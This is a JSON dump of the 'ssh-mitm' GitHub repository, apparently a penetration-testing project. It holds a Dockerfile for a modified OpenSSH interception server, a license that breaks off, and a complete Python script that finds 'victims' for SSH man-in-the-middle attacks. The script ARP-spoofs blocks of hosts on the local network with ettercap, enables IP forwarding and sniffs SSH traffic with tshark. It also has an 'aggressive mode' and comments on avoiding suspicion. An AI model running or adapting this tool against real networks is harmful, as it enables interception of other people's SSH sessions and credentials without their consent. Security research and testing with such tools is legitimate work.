{
  "metadata": {
    "timestamp": 1736710196479,
    "page": 897,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjkwMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "jtesta/ssh-mitm",
      "stars": 1637,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 2.3544921875,
          "content": "*~\n*.o\n*.a\n*.out\n\nopenssh-7.5p1-mitm/Makefile\nopenssh-7.5p1-mitm/config.h\nopenssh-7.5p1-mitm/config.status\nopenssh-7.5p1-mitm/autom4te.cache/\nopenssh-7.5p1-mitm/buildpkg.sh\nopenssh-7.5p1-mitm/openbsd-compat/Makefile\nopenssh-7.5p1-mitm/openbsd-compat/regress/Makefile\nopenssh-7.5p1-mitm/openssh.xml\nopenssh-7.5p1-mitm/opensshd.init\nopenssh-7.5p1-mitm/scp\nopenssh-7.5p1-mitm/sftp\nopenssh-7.5p1-mitm/sftp-server\nopenssh-7.5p1-mitm/ssh\nopenssh-7.5p1-mitm/ssh-add\nopenssh-7.5p1-mitm/ssh-agent\nopenssh-7.5p1-mitm/ssh-keygen\nopenssh-7.5p1-mitm/ssh-keyscan\nopenssh-7.5p1-mitm/ssh-keysign\nopenssh-7.5p1-mitm/ssh-pkcs11-helper\nopenssh-7.5p1-mitm/ssh_config.mitm\nopenssh-7.5p1-mitm/sshd\nopenssh-7.5p1-mitm/survey.sh\n\nopenssl-1.0.2u/test/*\nopenssl-1.0.2u/Makefile.bak\nopenssl-1.0.2u/apps/CA.pl.bak\nopenssl-1.0.2u/apps/md4.c\nopenssl-1.0.2u/apps/openssl\nopenssl-1.0.2u/certs/demo/3f77a2b5.0\nopenssl-1.0.2u/certs/demo/cbdbd8bc.0\nopenssl-1.0.2u/certs/demo/de4fa23b.0\nopenssl-1.0.2u/certs/demo/e83ef475.0\nopenssl-1.0.2u/crypto/*/lib\nopenssl-1.0.2u/crypto/aes/aes-x86_64.s\nopenssl-1.0.2u/crypto/aes/aesni-mb-x86_64.s\nopenssl-1.0.2u/crypto/aes/aesni-sha1-x86_64.s\nopenssl-1.0.2u/crypto/aes/aesni-sha256-x86_64.s\nopenssl-1.0.2u/crypto/aes/aesni-x86_64.s\nopenssl-1.0.2u/crypto/aes/bsaes-x86_64.s\nopenssl-1.0.2u/crypto/aes/vpaes-x86_64.s\nopenssl-1.0.2u/crypto/bn/rsaz-avx2.s\nopenssl-1.0.2u/crypto/bn/rsaz-x86_64.s\nopenssl-1.0.2u/crypto/bn/x86_64-gf2m.s\nopenssl-1.0.2u/crypto/bn/x86_64-mont.s\nopenssl-1.0.2u/crypto/bn/x86_64-mont5.s\nopenssl-1.0.2u/crypto/buildinf.h\nopenssl-1.0.2u/crypto/camellia/cmll-x86_64.s\nopenssl-1.0.2u/crypto/ec/ecp_nistz256-x86_64.s\nopenssl-1.0.2u/crypto/lib\nopenssl-1.0.2u/crypto/md5/md5-x86_64.s\nopenssl-1.0.2u/crypto/modes/aesni-gcm-x86_64.s\nopenssl-1.0.2u/crypto/modes/ghash-x86_64.s\nopenssl-1.0.2u/crypto/rc4/rc4-md5-x86_64.s\nopenssl-1.0.2u/crypto/rc4/rc4-x86_64.s\nopenssl-1.0.2u/crypto/sha/sha1-mb-x86_64.s\nopenssl-1.0.2u/crypto/sha/sha1-x86_64.s\nopenssl-1.0.2u/crypto/sha/sha256-mb-x86_64.s\nopenssl-1.0.2u/crypto/sha/sha256-x86_64.s\nopenssl-1.0.2u/crypto/sha/sha512-x86_64.s\nopenssl-1.0.2u/crypto/whrlpool/wp-x86_64.s\nopenssl-1.0.2u/crypto/x86_64cpuid.s\nopenssl-1.0.2u/engines/ccgost/lib\nopenssl-1.0.2u/engines/lib\nopenssl-1.0.2u/include/\nopenssl-1.0.2u/libcrypto.pc\nopenssl-1.0.2u/libssl.pc\nopenssl-1.0.2u/openssl.pc\nopenssl-1.0.2u/rehash.time\nopenssl-1.0.2u/ssl/lib\nopenssl-1.0.2u/tools/c_rehash.bak\n"
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 1.025390625,
          "content": "FROM ubuntu:20.04 as builder\n\n# Install openssh-client so we get ssh-keygen.\nRUN apt update -qq && apt install -y -q openssh-client\n\n\n# Copy ssh-keygen (and library dependency) to our final image.\nFROM ubuntu:20.04\nCOPY --from=builder /lib/x86_64-linux-gnu/libcrypto.so.1.1 /lib/x86_64-linux-gnu/libcrypto.so.1.1\nCOPY --from=builder /usr/bin/ssh-keygen /usr/bin/ssh-keygen\n\nRUN useradd -m -s /bin/bash ssh-mitm\n\nCOPY openssh-7.5p1-mitm/sshd /home/ssh-mitm/bin/sshd_mitm\nCOPY openssh-7.5p1-mitm/ssh /home/ssh-mitm/bin/ssh\nCOPY openssh-7.5p1-mitm/ssh_config.mitm /home/ssh-mitm/etc/ssh_config\nCOPY openssh-7.5p1-mitm/sshd_config /home/ssh-mitm/etc/sshd_config\nRUN chown ssh-mitm:ssh-mitm /home/ssh-mitm/etc/\n\nUSER ssh-mitm\nWORKDIR /home/ssh-mitm\nRUN mkdir -m 0700 /home/ssh-mitm/empty /home/ssh-mitm/.ssh /home/ssh-mitm/tmp /home/ssh-mitm/log\n\nCOPY docker/docker-entrypoint.sh /usr/local/bin/docker-entrypoint.sh\n\nEXPOSE 2222/tcp\n\nENTRYPOINT [\"/usr/local/bin/docker-entrypoint.sh\"]\nCMD /home/ssh-mitm/bin/sshd_mitm -D -f /home/ssh-mitm/etc/sshd_config\n"
        },
        {
          "name": "JoesAwesomeSSHMITMVictimFinder.py",
          "type": "blob",
          "size": 22.494140625,
          "content": "#!/usr/bin/python3\n#\n# JoesAwesomeSSHMITMVictimFinder.py\n# Copyright (C) 2017-2018  Joe Testa <jtesta@positronsecurity.com>\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms version 3 of the GNU General Public License as\n# published by the Free Software Foundation.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n#\n# Version: 1.0\n# Date:    June 28, 2017\n#\n#\n# This tool ARP spoofs the LAN in small chunks and looks for existing SSH\n# connections.  This makes finding victims for SSH man-in-the-middling very\n# easy (see https://github.com/jtesta/ssh-mitm).\n#\n# Install prerequisites with:\n# apt install nmap ettercap-text-only tshark python3-netaddr python3-netifaces\n#\n\n# Built-in modules.\nimport argparse, importlib, ipaddress, os, signal, subprocess, sys, tempfile, threading\nfrom time import sleep\n\n# Python3 is required.\nif sys.version_info.major < 3:\n    print('Error: Python3 is required.  Re-run using python3 interpreter.')\n    exit(-1)\n\n# Check if the netaddr and netifaces modules can be imported.  Otherwise, print\n# a useful message to the user with how to install them.\nold_netifaces = False\ntry:\n    import netaddr, netifaces\n\n    # Check if we're using an old version of netifaces (used in Ubuntu 14 and\n    # Linux Mint 17).  If so, the user will need to specify the gateway\n    # manually.\n    if (netifaces.version.startswith('0.8')):\n        old_netifaces = True\nexcept ImportError as e:\n    print(\"The Python3 netaddr and/or netifaces module is not installed.  Fix with:  apt install python3-netaddr python3-netifaces\")\n    exit(-1)\n\n\nettercap_proc = None\ntshark_proc = None\nforwarding_was_off = None\nmenu_thread = None\nmain_thread_continue = True\n\naggressive_mode = False\nverbose = False\ndebug = False\n\n# The overall findings, printed upon program termination.\ntotal_local_clients = []\ntotal_local_servers = []\n\n\n# Debug logging.\ndef d(msg):\n    if debug:\n        print(msg, flush=True)\n\n\n# Verbose logging.\ndef v(msg):\n    if verbose:\n        print(msg, flush=True)\n\n\n# Always print.\ndef p(msg=''):\n    print(msg, flush=True)\n\n\n# Captures control-C interruptions and gracefully terminates tshark and\n# ettercap.\ndef signal_handler(signum, frame):\n    global ettercap_proc, tshark_proc, forwarding_was_off, menu_thread\n\n    d('Signal handler called.')\n    p(\"\\nShutting down ettercap and tshark gracefully.  Please wait...\")\n\n    if menu_thread is not None:\n        menu_thread.stop()\n\n    # tshark can just be terminated.\n    if tshark_proc is not None:\n        d('Sending tshark SIGTERM...')\n        tshark_proc.terminate()\n\n    # ettercap, however, needs to be shut down gracefully so it can re-ARP\n    # victims.\n    if ettercap_proc is not None:\n        d('Telling ettercap to shut down gracefully...')\n        try:\n            ettercap_proc.communicate(\"q\\n\".encode('ascii'))\n        except ValueError as e:\n            # It is possible that the main thread already called communicate(),\n            # to terminate the process, so calling it again causes an exception.\n            # In this case, just wait for it to terminate.\n            pass\n\n    # Wait up to 20 seconds for tshark to terminate, then print its return code\n    # to the debug log.\n    if tshark_proc is not None:\n        try:\n            retcode = tshark_proc.wait(20)\n            tshark_proc = None\n            d('tshark terminated with return code %d' % retcode)\n        except subprocess.TimeoutExpired as e:\n            p('WARNING: tshark did not terminate after 20 seconds!  Sending SIGKILL...')\n            pass\n\n    # tshark survived more than 20 seconds after a SIGTERM, so now send it\n    # SIGKILL and wait up to 10 more seconds.\n    if tshark_proc is not None:\n        try:\n            tshark_proc.kill()\n            retcode = tshark_proc.wait(10)\n            tshark_proc = None\n            d('After SIGKILL, tshark terminated with return code %d' % retcode)\n        except subprocess.TimeoutExpired as e:\n            p('ERROR: tshark did not terminate after 10 seconds, even with SIGKILL.  Try manually killing it (process ID %d).' % tshark_proc.pid)\n            pass\n\n    # Wait up to 20 seconds for ettercap to quit after telling it to.\n    if ettercap_proc is not None:\n        try:\n            retcode = ettercap_proc.wait(20)\n            ettercap_proc = None\n            d('ettercap terminated with return code %d' % retcode)\n        except subprocess.TimeoutExpired as e:\n            pass\n\n    # ettercap survived more than 20 seconds after a SIGTERM, so now send it\n    # SIGKILL and wait up to 10 more seconds.\n    if ettercap_proc is not None:\n        d('WARNING: ettercap did not exit gracefully after requesting it to quit.  Now sending it SIGKILL...')\n        ettercap_proc.kill()\n        try:\n            retcode = ettercap_proc.wait(10)\n            ettercap_proc = None\n            d('ettercap terminated with return code %d' % retcode)\n        except subprocess.TimeoutExpired as e:\n            p('ERROR: ettercap did not terminate after 10 seconds, even with SIGKILL.  Try manually killing it (process ID %d).' % ettercap_proc.pid)\n            pass\n\n    # If IP forwarding was off before this script was launched, disable it\n    # before terminating.\n    if forwarding_was_off is True:\n        v('IP forwarding was off before.  Disabling it now...')\n        enable_ip_forwarding(False)\n\n\n    # Print all the IPs found.\n    print_discovered()\n\n    if menu_thread is not None:\n        d(\"Waiting for menu thread to terminate...\")\n        menu_thread.join()\n\n    exit(0)\n\n\ndef print_discovered():\n    p()\n    if len(total_local_clients) > 0:\n        p(\"\\nTotal local clients:\")\n        for tup in total_local_clients:\n            p('  * %s -> %s:22' % (tup[0], tup[1]))\n        p()\n    else:\n        p('No local clients found.  :(')\n\n    if len(total_local_servers) > 0:\n        p(\"\\nTotal local servers:\")\n        for tup in total_local_servers:\n            p('  * %s -> %s:22' % (tup[1], tup[0]))\n        p()\n\n\n# This is the thread that reads user input while the program is running.\nclass MenuHandler(threading.Thread):\n\n    def __init__(self):\n        threading.Thread.__init__(self, name=\"MenuHandler\")\n        self.stop_requested = False\n\n    def run(self):\n        global debug, verbose, aggressive_mode, total_local_clients, total_local_servers, main_thread_continue\n\n        while not self.stop_requested:\n            try:\n                c = input()[0:1].lower()\n            except ValueError as e:\n                self.stop_requested = True\n                continue\n\n            if c == 'h':\n                print_menu()\n            elif c == 'a':  # Toggle aggressive mode.\n                if aggressive_mode is False:\n                    aggressive_mode = True\n                    p('Enabled aggressive mode')\n                else:\n                    aggressive_mode = False\n                    p('Disabled aggressive mode')\n            elif c == 'q':  # Graceful quit.\n                self.stop()\n                main_thread_continue = False  # Tell main thread to quit.\n                p(\"\\nQuitting after current block is complete.  Please wait...\")\n            elif c == 'd':  # Toggle debugging mode.\n                if debug is False:\n                    debug = True\n                    verbose = True\n                    p(\"Enabled debugging mode.\")\n                else:\n                    debug = False\n                    verbose = False\n                    p(\"\\nDisabled debugging mode.\")\n            elif c == 'v':  # Toggle verbose mode.\n                debug = False\n                if verbose is False:\n                    verbose = True\n                    p(\"Enabled verbose mode.\")\n                else:\n                    p(\"\\nDisabled verbose mode.\")\n            elif c == 'p':  # Print status.\n                print_discovered()\n\n        d(\"Menu thread exiting.\")\n\n\n    def stop(self):\n        self.stop_requested = True\n\n\n# Ensure that nmap, ettercap, and tshark are all installed, and we are running\n# as root.  Terminates otherwise.\ndef check_prereqs():\n    missing_progs = []\n    if not find_prog(['nmap', '-V']):\n        missing_progs.append('nmap')\n\n    if not find_prog(['ettercap', '-v']):\n        missing_progs.append('ettercap-text-only')\n\n    if not find_prog(['tshark', '-v']):\n        missing_progs.append('tshark')\n\n    if len(missing_progs) > 0:\n        missing_progs_str = ' '.join(missing_progs)\n        p(\"Error: the following pre-requisite programs are missing: %s\\n\\nInstall them with:  apt install %s\" % (missing_progs_str, missing_progs_str))\n        exit(-1)\n\n    # We must be running as root for ettercap to work.\n    if os.geteuid() != 0:\n        p(\"Error: you must run this script as root.\")\n        exit(-1)\n\n    # Check if there are existing PREROUTING NAT rules enabled, and warn the\n    # user of potential side-effects.\n    try:\n        hProc = subprocess.Popen(['iptables', '-t', 'nat', '-nL', 'PREROUTING'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)\n        so, se = hProc.communicate()\n        prerouting_output = so.decode('ascii')\n\n        # Output with no rules has two lines.\n        if prerouting_output.count(\"\\n\") > 2:\n            p(\"\\nWARNING: it appears that you have entries in your PREROUTING NAT table.  Searching for SSH connections on the LAN with this script while PREROUTING rules are enabled may have unintended side-effects.  The output of 'iptables -t nat -nL PREROUTING' is:\\n\\n%s\\n\\n\" % prerouting_output)\n    except FileNotFoundError as e:\n        p('Warning: failed to run iptables.  Continuing...')\n        pass\n\n\n# Returns True if a program is installed on the system, otherwise False.\ndef find_prog(prog_args):\n    prog_found = False\n    try:\n        hProc = subprocess.Popen(prog_args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)\n        s, e = hProc.communicate()\n        prog_found = True\n    except FileNotFoundError as e:\n        pass\n\n    return prog_found\n\n\n# Returns True if IP forwarding is enabled, otherwise False.\ndef get_ip_forward_settings():\n    ipv4_setting = None\n\n    with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:\n        ipv4_setting = f.read().strip()\n\n    return ipv4_setting.strip() == '1'\n\n\n# Enables or disables IP forwarding.  If it was disabled prior to calling this\n# function, returns True (helpful for knowing if it needs to be turned back off\n# later).\ndef enable_ip_forwarding(flag):\n    old_ipv4_setting = get_ip_forward_settings()\n\n    if flag and not old_ipv4_setting:\n        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:\n            f.write('1')\n\n    if not flag and old_ipv4_setting:\n        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:\n            f.write('0')\n\n    # Enable or disable forwarding in the firewall, as appropriate.\n    if flag:\n        subprocess.call(\"iptables -P FORWARD ACCEPT\", shell=True)\n    else:\n        subprocess.call(\"iptables -P FORWARD DROP\", shell=True)\n\n    current_ipv4_setting = get_ip_forward_settings()\n    if current_ipv4_setting != flag:\n        raise RuntimeError('Failed to set IP forwarding setting!: %r %r' % (current_ipv4_setting, flag))\n\n    return old_ipv4_setting == False\n\n\n# Runs nmap to get the devices on the LAN that are alive (using ARP pings).\ndef get_lan_devices(network, gateway, ignore_list):\n    ret = []\n    fd, temp = tempfile.mkstemp()\n    os.close(fd)\n\n    hNmap = subprocess.Popen(['nmap', '-n', '-oG=%s' % temp, '-sn', '-PR', network], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)\n\n    try:\n        hNmap.wait(30)\n    except subprocess.TimeoutExpired as e:\n        p('Nmap ARP ping took longer than 30 seconds.  Terminating...')\n        exit(-1)\n\n    nmap_output = ''\n    with open(temp, 'r') as f:\n        nmap_output = f.readlines()\n\n    # Delete nmap's output file.\n    if os.path.exists(temp):\n        os.remove(temp)\n\n    for line in nmap_output:\n        tokens = line.split()\n        if tokens[0] == 'Host:':\n           ret.append(tokens[1])\n\n    # Remove the gateway from the list of live devices.\n    if gateway in ret:\n        ret.remove(gateway)\n\n    # Remove the entries of the ignore_list from the list of live devices.\n    for ip in ignore_list:\n        if ip in ret:\n            ret.remove(ip)\n\n    return ret\n\n\ndef print_menu():\n    p('Interactive menu keys:')\n    p()\n    p(\"  [a] toggle aggressive mode (spoofs all destination devices, not just\\n      gateway)\")\n    p(\"  [d] toggle debugging mode (highest verbosity)\")\n    p(\"  [v] toggle verbose mode (moderate verbosity)\")\n    p(\"  [p] print status\")\n    p()\n    p(\"  [h] prints this menu\")\n    p(\"  [q] quits program gracefully\")\n    p()\n\n\n# Splits a list of devices into blocks of size \"block_size\".\ndef blocketize_devices(devices, block_size):\n    device_blocks = []\n    device_block = []\n    i = 0\n    for device in devices:\n        device_block.append(device)\n        i += 1\n\n        if (i >= block_size) or (devices.index(device) == (len(devices) - 1)) :\n            i = 0\n            device_blocks.append(device_block)\n            device_block = []\n\n    return device_blocks\n\n\ndef arp_spoof_and_monitor(interface, local_addresses, gateway, device_block, listen_time):\n    global ettercap_proc, tshark_proc\n\n    # Run tshark with an SSH filter.\n    tshark_args = ['tshark', '-i', interface, '-T', 'fields', '-e', 'ip.src', '-e', 'ip.dst', '-e', 'tcp.port']\n\n    # Exclude packets to or from the local machine.\n    if len(local_addresses) > 0:\n        tshark_args.extend(['-f', 'port 22 and not(host %s)' % ' or host '.join(local_addresses)])\n    else:\n        tshark_args.extend(['-f', 'port 22'])\n\n    d('Running tshark: %s' % ' '.join(tshark_args))\n    tshark_proc = subprocess.Popen(tshark_args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)\n\n    # By default, the first target group is the gateway.  This means only\n    # connections going outside the LAN will be discovered.  If aggressive\n    # mode is enabled, then all local and remote connections will be\n    # found.\n    target1 = gateway\n    if aggressive_mode:\n        target1 = ''\n\n    # ARP spoof the block of devices and gateway.\n    ettercap_args = ['ettercap', '-i', interface, '-T', '-M', 'arp', '/%s//' % target1, '/%s//' % ','.join(device_block)]\n    d('Running ettercap: %s' % ' '.join(ettercap_args))\n    ettercap_proc = subprocess.Popen(ettercap_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n\n    # Sleep for the specified number of seconds while tshark gathers info.\n    d('Sleeping for %d seconds...' % listen_time)\n    sleep(listen_time)\n\n    # Stop tshark.\n    tshark_proc.terminate()\n\n    # Send 'q' and a newline to tell ettercap to quit gracefully.\n    so, se = ettercap_proc.communicate(\"q\\n\".encode('ascii'))\n\n    # Get the output from the terminated tshark process.\n    so, se = tshark_proc.communicate()\n    lines = so.decode('ascii').split(\"\\n\")\n\n    local_clients = []\n    local_servers = []\n\n    # Each line is in the following format:\n    # 10.x.x.x\\t174.x.x.x\\t38564,22\n    for line in lines:\n       if line == '':\n           continue\n\n       fields = line.split(\"\\t\")\n       ip1 = fields[0]\n       ip2 = fields[1]\n\n       ports = fields[2].split(',')\n       port1 = ports[0]\n       port2 = ports[1]\n\n       local_client = None\n       local_server = None\n       remote_client = None\n       remote_server = None\n       if (ip1 in device_block) and (port2 == '22'):\n           local_client = ip1\n           remote_server = ip2\n       elif (ip2 in device_block) and (port1 == '22'):\n           local_client = ip2\n           remote_server = ip1\n       elif (ip1 in device_block) and (port1 == '22'):\n           local_server = ip1\n           remote_client = ip2\n       elif (ip2 in device_block) and (port2 == '22'):\n           local_server = ip2\n           remote_client = ip1\n       else:\n           p('Strange tshark output found: [%s]' % line)\n           p(\"\\tdevice block: [%s]\" % \",\".join(device_block))\n           continue\n\n       # Look for outgoing connections.\n       if (local_client is not None) and (remote_server is not None):\n           tup = (local_client, remote_server)\n           if tup not in local_clients:\n               local_clients.append(tup)\n       # Look for incoming connections (implying a server is running on the\n       # LAN).\n       elif (local_server is not None) and (remote_client is not None):\n           tup = (local_server, remote_client)\n           if tup not in local_servers:\n               local_servers.append(tup)\n\n    if len(local_clients) == 0 and len(local_servers) == 0:\n       v('No SSH connections found.')\n\n    if len(local_clients) > 0:\n       p(\"\\nLocal clients:\")\n       for tup in local_clients:\n           p('  * %s -> %s:22' % (tup[0], tup[1]))\n       p()\n       total_local_clients.extend(x for x in local_clients if x not in total_local_clients)\n\n    if len(local_servers) > 0:\n       p(\"\\nLocal servers:\")\n       for tup in local_servers:\n           p('  * %s -> %s:22' % (tup[1], tup[0]))\n       p()\n       total_local_servers.extend(x for x in local_servers if x not in total_local_servers)\n\n\nif __name__ == '__main__':\n    check_prereqs()\n\n    parser = argparse.ArgumentParser()\n    required = parser.add_argument_group('required arguments')\n    required.add_argument('--interface', help='the network interface to listen on', required=True)\n    parser.add_argument('--block-size', help='the number of IPs to ARP spoof at a time (default: 5)', default=5)\n    parser.add_argument('--listen-time', help='the number of seconds to listen for SSH activity (default: 20)', default=20)\n    parser.add_argument('--ignore-ips', help='the IPs to ignore.  Can be space or comma-delimited', nargs='+', default=[])\n    parser.add_argument('--one-pass', help='perform one pass of the network only, instead of looping', action='store_true')\n    parser.add_argument('-v', '--verbose', help='enable verbose messages', action='store_true')\n    parser.add_argument('-d', '--debug', help='enable debugging messages', action='store_true')\n\n    # If we loaded an old netifaces module, the user must specify the gateway\n    # manually.\n    if old_netifaces:\n        required.add_argument('--gateway', help='the network gateway', required=True)\n\n    args = vars(parser.parse_args())\n\n\n    # The network interface to use.\n    interface = args['interface']\n\n    # A list of IPs to ignore.\n    ignore_list = args['ignore_ips']\n\n    # If the user specified the ignore list as \"--ignore-ips 1.1.1.1,2.2.2.2\",\n    # parse them out into a list.\n    if len(ignore_list) == 1:\n        ips = ignore_list[0]\n        if ips.find(',') != -1:\n            ignore_list = ips.split(',')\n\n    # Ensure IPs are in a valid form.\n    for ip in ignore_list:\n        try:\n            ipaddress.ip_address(ip)\n        except ValueError as e:\n            p('Error: %s is not a valid IP address.' % ip)\n            exit(-1)\n\n    # Parse the interface arg.\n    addresses = None\n    try:\n        addresses = netifaces.ifaddresses(interface)\n    except ValueError as e:\n        p('Error parsing interface: %s' % str(e))\n        exit(-1)\n\n    # Add our address(es) to the ignore list.\n    local_addresses = []\n    if netifaces.AF_INET in addresses:\n        for net_info in addresses[netifaces.AF_INET]:\n            address = net_info['addr']\n            p(\"Found local address %s and adding to ignore list.\" % address)\n            local_addresses.append(address)\n            ignore_list.append(address)\n\n    if len(local_addresses) == 0:\n        p(\"Error: failed to get the IP address for interface %s\" % interface)\n        exit(-1)\n\n    # Get the CIDR format of our network.\n    net_info = addresses[netifaces.AF_INET][0]\n    net_cidr = str(netaddr.IPNetwork('%s/%s' % (net_info['addr'], net_info['netmask'])))\n    p(\"Using network CIDR %s.\" % net_cidr)\n\n    # Get the default gateway.\n    if old_netifaces:\n        gateway = args['gateway']\n    else:\n        gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]\n    p(\"Found default gateway: %s\" % gateway)\n\n    # The number of IPs in the LAN to ARP spoof at a time.  This should be a\n    # relatively low number, as spoofing too many clients at a time can cause\n    # noticeable slowdowns.\n    block_size = int(args['block_size'])\n\n    # The number of seconds to sniff a MITMed block of clients before moving on\n    # to the next block.\n    listen_time = int(args['listen_time'])\n\n    # If True, only one pass is done over the clients in the network.\n    # Otherwise, it will loop indefinitely.\n    one_pass = args['one_pass']\n\n    # Flags to control verbose and debug outputs.\n    verbose = args['verbose']\n    debug = args['debug']\n\n    p('IP blocks of size %d will be spoofed for %d seconds each.' % (block_size, listen_time))\n    if len(ignore_list) > 0:\n        p('The following IPs will be skipped: %s' % ' '.join(ignore_list))\n    if one_pass:\n        p('The network will be scanned in only one pass.')\n    p(\"\\n\")\n\n    # If the user raised the block size to 10 or greater, warn them about the\n    # potential consequences.\n    if block_size >= 10:\n        p(\"WARNING: setting the block size too high will cause strain on your network interface.  Eventually, your interface will start dropping frames, causing a network denial-of-service and greatly raising suspicion.  However, raising the block size is safe on low-utilization networks.  You better know what you're doing!\\n\")\n\n    print_menu()\n    menu_thread = MenuHandler()\n    menu_thread.start()\n\n    # Enable the signal handlers so that ettercap and tshark gracefully shut\n    # down on CTRL-C.\n    signal.signal(signal.SIGINT, signal_handler)\n    signal.signal(signal.SIGTERM, signal_handler)\n\n    forwarding_was_off = enable_ip_forwarding(True)\n    while main_thread_continue:\n\n        v('Discovering devices on LAN via ARP ping...')\n        devices = get_lan_devices(net_cidr, gateway, ignore_list)\n        d('%d devices discovered: %s' % (len(devices), \", \".join(devices)))\n\n        # Arrange the devices into groups of size \"block_size\".\n        device_blocks = blocketize_devices(devices, block_size)\n\n        # ARP spoof and monitor each block.\n        for device_block in device_blocks:\n            arp_spoof_and_monitor(interface, local_addresses, gateway, device_block, listen_time)\n\n        # If we are only supposed to do one pass, then stop now.\n        if one_pass:\n            break\n\n    menu_thread.stop()\n    menu_thread.join()\n\n    # If IP forwarding was off before we started, turn it off now.\n    if forwarding_was_off:\n        enable_ip_forwarding(False)\n\n    if one_pass:\n        p('Single pass complete.')\n\n    exit(0)\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 35.7470703125,
          "content": "The two-clause BSD license, directly below, applies to the patch to the OpenSSH code *only*.  All other code is licensed under the GNU Public License v3.0, underneath.\n\n---\n\nCopyright 2017-2019 Joseph S. Testa II\n\nRedistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:\n\n1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.\n\n2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n---\n\n                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n\n Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The GNU General Public License is a free, copyleft license for\nsoftware and other kinds of works.\n\n  The licenses for most software and other practical works are designed\nto take away your freedom to share and change the works.  By contrast,\nthe GNU General Public License is intended to guarantee your freedom to\nshare and change all versions of a program--to make sure it remains free\nsoftware for all its users.  We, the Free Software Foundation, use the\nGNU General Public License for most of our software; it applies also to\nany other work released this way by its authors.  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthem if you wish), that you receive source code or can get it if you\nwant it, that you can change the software or use pieces of it in new\nfree programs, and that you know you can do these things.\n\n  To protect your rights, we need to prevent others from denying you\nthese rights or asking you to surrender the rights.  Therefore, you have\ncertain responsibilities if you distribute copies of the software, or if\nyou modify it: responsibilities to respect the freedom of others.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must pass on to the recipients the same\nfreedoms that you received.  You must make sure that they, too, receive\nor can get the source code.  And you must show them these terms so they\nknow their rights.\n\n  Developers that use the GNU GPL protect your rights with two steps:\n(1) assert copyright on the software, and (2) offer you this License\ngiving you legal permission to copy, distribute and/or modify it.\n\n  For the developers' and authors' protection, the GPL clearly explains\nthat there is no warranty for this free software.  For both users' and\nauthors' sake, the GPL requires that modified versions be marked as\nchanged, so that their problems will not be attributed erroneously to\nauthors of previous versions.\n\n  Some devices are designed to deny users access to install or run\nmodified versions of the software inside them, although the manufacturer\ncan do so.  This is fundamentally incompatible with the aim of\nprotecting users' freedom to change the software.  The systematic\npattern of such abuse occurs in the area of products for individuals to\nuse, which is precisely where it is most unacceptable.  Therefore, we\nhave designed this version of the GPL to prohibit the practice for those\nproducts.  If such problems arise substantially in other domains, we\nstand ready to extend this provision to those domains in future versions\nof the GPL, as needed to protect the freedom of users.\n\n  Finally, every program is threatened constantly by software patents.\nStates should not allow patents to restrict development and use of\nsoftware on general-purpose computers, but in those that do, we wish to\navoid the special danger that patents applied to a free program could\nmake it effectively proprietary.  To prevent this, the GPL assures that\npatents cannot be used to render the program non-free.\n\n  The precise terms and conditions for copying, distribution and\nmodification follow.\n\n                       TERMS AND CONDITIONS\n\n  0. Definitions.\n\n  \"This License\" refers to version 3 of the GNU General Public License.\n\n  \"Copyright\" also means copyright-like laws that apply to other kinds of\nworks, such as semiconductor masks.\n\n  \"The Program\" refers to any copyrightable work licensed under this\nLicense.  Each licensee is addressed as \"you\".  \"Licensees\" and\n\"recipients\" may be individuals or organizations.\n\n  To \"modify\" a work means to copy from or adapt all or part of the work\nin a fashion requiring copyright permission, other than the making of an\nexact copy.  The resulting work is called a \"modified version\" of the\nearlier work or a work \"based on\" the earlier 